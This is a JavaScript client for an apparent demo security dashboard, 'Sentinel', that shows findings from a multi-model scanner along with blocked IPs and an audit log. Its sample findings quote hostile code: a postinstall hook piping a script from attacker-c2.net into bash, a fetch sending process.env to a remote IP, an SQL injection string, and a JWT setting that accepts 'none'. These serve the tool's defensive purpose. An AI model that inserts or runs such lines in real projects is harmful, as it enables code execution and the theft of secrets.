// Sentinel Dashboard Interactive Client

// Demo Data State
let findingsData = [
  {
    id: "SENT-SUPPLY-01",
    file: "package.json",
    line_start: 12,
    line_end: 14,
    category: "SUPPLY_CHAIN",
    severity: "CRITICAL",
    title: "Malicious Remote Script in postinstall Lifecycle Hook",
    explanation: "Dependency update adds a postinstall hook downloading and executing an unverified bash script from an external server.",
    evidence_quote: '"postinstall": "curl -s http://attacker-c2.net/payload.sh | bash"',
    suggested_patch: '- "postinstall": "curl -s http://attacker-c2.net/payload.sh | bash"\n+ // Removed unauthorized remote lifecycle hook',
    status: "PENDING_APPROVAL"
  },
  {
    id: "SENT-INJ-02",
    file: "src/api/users.py",
    line_start: 45,
    line_end: 47,
    category: "INJECTION",
    severity: "HIGH",
    title: "SQL Injection via Formatted String",
    explanation: "User input is formatted directly into a raw SQL query string without parameterized arguments.",
    evidence_quote: 'query = f"SELECT * FROM users WHERE org_id = \'{org_id}\' AND role = \'{role}\'"',
    suggested_patch: '- query = f"SELECT * FROM users WHERE org_id = \'{org_id}\' AND role = \'{role}\'"\n+ cursor.execute("SELECT * FROM users WHERE org_id = %s AND role = %s", (org_id, role))',
    status: "PENDING_APPROVAL"
  },
  {
    id: "SENT-AUTH-03",
    file: "config/jwt.ts",
    line_start: 28,
    line_end: 29,
    category: "AUTH_BYPASS",
    severity: "HIGH",
    title: "Unsigned JWT Algorithm 'none' Allowed",
    explanation: "JWT verification explicitly permits the 'none' algorithm, enabling attackers to forge administrative tokens.",
    evidence_quote: 'jwt.verify(token, secret, { algorithms: ["HS256", "none"] });',
    suggested_patch: '- algorithms: ["HS256", "none"]\n+ algorithms: ["HS256"]',
    status: "PENDING_APPROVAL"
  },
  {
    id: "SENT-SUPPLY-04",
    file: "lib/telemetry.js",
    line_start: 88,
    line_end: 90,
    category: "SUPPLY_CHAIN",
    severity: "HIGH",
    title: "Suspicious Environment Variable Exfiltration",
    explanation: "Telemetry module transmits the entire process.env object over outbound HTTP POST to an unlisted IP.",
    evidence_quote: 'fetch("https://198.51.100.88/telemetry", { method: "POST", body: JSON.stringify(process.env) });',
    suggested_patch: '- fetch("https://198.51.100.88/telemetry", { method: "POST", body: JSON.stringify(process.env) });\n+ // Blocked unauthorized environment exfiltration',
    status: "PENDING_APPROVAL"
  }
];

let disagreementsData = [
  {
    category: "SUPPLY_CHAIN",
    file: "package.json",
    line_range: "L12-L14",
    reporting_jurors: ["Supply-Chain Specialist (SmolLM 2)", "Injection Specialist (Llama 3.2)"],
    dissenting_jurors: ["Auth & Secrets Specialist (Qwen 2.5)"],
    resolution: "Line evidence confirmed presence of curl download in lifecycle hook. Supply-Chain Specialist role has higher domain weighting. Finding accepted as CRITICAL."
  },
  {
    category: "AUTH_SECRETS",
    file: "config/jwt.ts",
    line_range: "L28-L29",
    reporting_jurors: ["Auth & Secrets Specialist (Qwen 2.5)"],
    dissenting_jurors: ["Injection Specialist (Llama 3.2)", "Supply-Chain Specialist (SmolLM 2)"],
    resolution: "Verified exact code line permitting unsigned 'none' algorithm. Auth specialist recommendation confirmed with exact quote."
  },
  {
    category: "OBFUSCATION",
    file: "src/utils.js",
    line_range: "L102-L105",
    reporting_jurors: ["Supply-Chain Specialist (SmolLM 2)"],
    dissenting_jurors: ["Injection Specialist (Llama 3.2)", "Auth & Secrets Specialist (Qwen 2.5)"],
    resolution: "Evidence quote was not found in actual source file (hallucination). Judge step DISCARDED this claim."
  }
];

let blockedIps = [
  { ip: "203.0.113.195", reason: "SQL injection probe pattern in query parameters", blockedAt: "5 min ago", ttl: 600 },
  { ip: "198.51.100.44", reason: "Automated vulnerability scanner user-agent (sqlmap/1.7)", blockedAt: "12 min ago", ttl: 180 }
];

let auditEntries = [
  { timestamp: "2026-10-26T12:50:00Z", event: "SCAN_INITIALIZED", actor: "sentinel-ci", target: "src/", hash: "9f83ab12e09c" },
  { timestamp: "2026-10-26T12:50:03Z", event: "SECRET_REDACTION", actor: "SecretRedactor", target: "scrubbed 2 tokens", hash: "4a2b99ef7108" },
  { timestamp: "2026-10-26T12:50:15Z", event: "JURY_VERDICTS_COLLECTED", actor: "JuryEngine", target: "3 jurors responded", hash: "b890cc1124fa" },
  { timestamp: "2026-10-26T12:50:16Z", event: "JUDGE_RECONCILIATION", actor: "SentinelJudge", target: "4 verified, 7 discarded", hash: "1d83049ba72f" },
  { timestamp: "2026-10-26T12:52:45Z", event: "GUARD_IP_BLOCKED", actor: "SentinelGuard", target: "203.0.113.195", hash: "6e2109fab830" }
];

// Navigation Switcher
function switchTab(tabId) {
  document.querySelectorAll('.nav-link').forEach(link => {
    link.classList.toggle('active', link.getAttribute('data-tab') === tabId);
  });
  document.querySelectorAll('.tab-pane').forEach(pane => {
    pane.classList.toggle('active', pane.id === `tab-${tabId}`);
  });
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

document.querySelectorAll('.nav-link').forEach(link => {
  link.addEventListener('click', (e) => {
    e.preventDefault();
    const tabId = link.getAttribute('data-tab');
    switchTab(tabId);
  });
});

// Dashboard SubTab Switcher
function showSubTab(subTabId) {
  document.querySelectorAll('.dash-tab').forEach(tab => {
    tab.classList.toggle('active', tab.getAttribute('onclick').includes(subTabId));
  });
  document.querySelectorAll('.subtab-content').forEach(content => {
    content.classList.toggle('active', content.id === `subtab-${subTabId}`);
  });
}

// Render Findings List
function renderFindings() {
  const container = document.getElementById('findings-container');
  if (!container) return;
  container.innerHTML = '';

  findingsData.forEach((f, idx) => {
    const card = document.createElement('div');
    card.className = 'finding-card';
    card.id = `finding-${f.id}`;

    const sevClass = f.severity.toLowerCase();
    const isApproved = f.status === 'APPROVED';

    card.innerHTML = `
      <div class="finding-header">
        <div class="finding-title-row">
          <span class="badge badge-${sevClass}">${f.severity}</span>
          <span class="finding-title">${f.title}</span>
          <span class="badge-tag">${f.category}</span>
        </div>
        <span class="finding-loc">${f.file}:${f.line_start}-${f.line_end}</span>
      </div>
      <div class="finding-explanation">${f.explanation}</div>
      <div class="finding-evidence"><strong>Evidence:</strong> ${escapeHtml(f.evidence_quote)}</div>
      <div class="patch-box">${escapeHtml(f.suggested_patch)}</div>
      <div class="finding-actions">
        ${isApproved ? 
          `<button class="btn btn-sm btn-outline" onclick="rollbackFix('${f.id}')">↩ Rollback Fix</button>
           <span class="badge badge-success" style="align-self:center;">✓ Fix Applied & Tests Passed</span>` :
          `<button class="btn btn-sm btn-primary" onclick="approveFix('${f.id}')">Approve & Apply Patch</button>
           <button class="btn btn-sm btn-outline" onclick="dismissFinding('${f.id}')">Dismiss Finding</button>`
        }
      </div>
    `;
    container.appendChild(card);
  });

  updateKpis();
}

// Render Deliberations
function renderDisagreements() {
  const container = document.getElementById('disagreements-container');
  if (!container) return;
  container.innerHTML = '';

  disagreementsData.forEach(d => {
    const item = document.createElement('div');
    item.className = 'disagree-item';
    item.innerHTML = `
      <div class="disagree-header">
        <span>${d.category} at <code>${d.file}</code> (${d.line_range})</span>
        <span class="badge badge-warning">Deliberation</span>
      </div>
      <p style="font-size:0.85rem; color: var(--text-secondary); margin-bottom: 0.5rem;">
        <strong>Reporting Jurors:</strong> ${d.reporting_jurors.join(', ')}<br>
        <strong>Dissenting Jurors:</strong> ${d.dissenting_jurors.join(', ')}
      </p>
      <p style="font-size:0.85rem; color: var(--accent-blue); background: rgba(59,130,246,0.08); padding: 0.5rem; border-radius: 4px;">
        <strong>Judge Resolution:</strong> ${d.resolution}
      </p>
    `;
    container.appendChild(item);
  });
}

// Render Blocked IPs
function renderBlockedIps() {
  const tbody = document.getElementById('blocked-ips-body');
  if (!tbody) return;
  tbody.innerHTML = '';

  blockedIps.forEach((item, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><code>${item.ip}</code></td>
      <td>${item.reason}</td>
      <td>${item.blockedAt}</td>
      <td><span class="badge badge-warning">${item.ttl}s TTL</span></td>
      <td>
        <button class="btn btn-sm btn-outline" onclick="unblockIp('${item.ip}')">Unblock IP</button>
      </td>
    `;
    tbody.appendChild(tr);
  });

  document.getElementById('kpi-blocked').textContent = blockedIps.length;
  document.getElementById('blocked-count-badge').textContent = blockedIps.length;
}

// Render Audit Log Entries
function renderAuditLog() {
  const container = document.getElementById('audit-log-entries');
  if (!container) return;
  container.innerHTML = '';

  auditEntries.forEach(e => {
    const row = document.createElement('div');
    row.className = 'audit-entry';
    row.innerHTML = `
      <div>
        <span style="color:var(--text-muted);">[${e.timestamp}]</span>
        <strong style="color:var(--accent-blue); margin: 0 0.5rem;">${e.event}</strong>
        <span>Target: ${e.target}</span>
      </div>
      <span class="audit-hash">SHA256: ${e.hash}...</span>
    `;
    container.appendChild(row);
  });
}

// Interactive Actions
function approveFix(findingId) {
  const finding = findingsData.find(f => f.id === findingId);
  if (finding) {
    finding.status = 'APPROVED';
    auditEntries.push({
      timestamp: new Date().toISOString(),
      event: 'PATCH_APPROVED_APPLIED',
      actor: 'developer-ui',
      target: finding.file,
      hash: Math.random().toString(16).substring(2, 14)
    });
    renderFindings();
    renderAuditLog();
    alert(`Security fix applied for ${findingId}! Tests passed. Automated rollback backup created in .sentinel_patches/.`);
  }
}

function rollbackFix(findingId) {
  const finding = findingsData.find(f => f.id === findingId);
  if (finding) {
    finding.status = 'PENDING_APPROVAL';
    auditEntries.push({
      timestamp: new Date().toISOString(),
      event: 'PATCH_ROLLED_BACK',
      actor: 'developer-ui',
      target: finding.file,
      hash: Math.random().toString(16).substring(2, 14)
    });
    renderFindings();
    renderAuditLog();
    alert(`Rollback executed for ${findingId}. File restored to original pre-patch state.`);
  }
}

function dismissFinding(findingId) {
  findingsData = findingsData.filter(f => f.id !== findingId);
  renderFindings();
}

function unblockIp(ip) {
  blockedIps = blockedIps.filter(b => b.ip !== ip);
  auditEntries.push({
    timestamp: new Date().toISOString(),
    event: 'GUARD_IP_UNBLOCKED',
    actor: 'admin-dashboard',
    target: ip,
    hash: Math.random().toString(16).substring(2, 14)
  });
  renderBlockedIps();
  renderAuditLog();
}

function updateKpis() {
  const activeCount = findingsData.filter(f => f.status !== 'APPROVED').length;
  const score = activeCount * 17.0;
  const kpiScore = document.getElementById('kpi-score');
  const kpiFindings = document.getElementById('kpi-findings');
  const findingsBadge = document.getElementById('findings-count-badge');

  if (kpiScore) kpiScore.innerHTML = `${score.toFixed(1)} <small>/ 100</small>`;
  if (kpiFindings) kpiFindings.textContent = activeCount;
  if (findingsBadge) findingsBadge.textContent = activeCount;
}

function triggerRescan() {
  alert("Running Sentinel Multi-Model Jury scan... Redacting secrets -> querying Llama 3.2, Qwen 2.5, SmolLM 2 -> running Judge step.");
  renderFindings();
}

function verifyAuditUI() {
  alert("✓ Cryptographic Audit Chain Verified: All entries unbroken and chained by SHA-256 digests.");
}

function escapeHtml(text) {
  if (!text) return '';
  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// Theme Toggle
const themeToggle = document.getElementById('theme-toggle');
if (themeToggle) {
  themeToggle.addEventListener('click', () => {
    const current = document.documentElement.getAttribute('data-theme');
    const next = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('sentinel-theme', next);
  });
}

// Init on load
document.addEventListener('DOMContentLoaded', () => {
  const savedTheme = localStorage.getItem('sentinel-theme') || 'dark';
  document.documentElement.setAttribute('data-theme', savedTheme);
  renderFindings();
  renderDisagreements();
  renderBlockedIps();
  renderAuditLog();
});
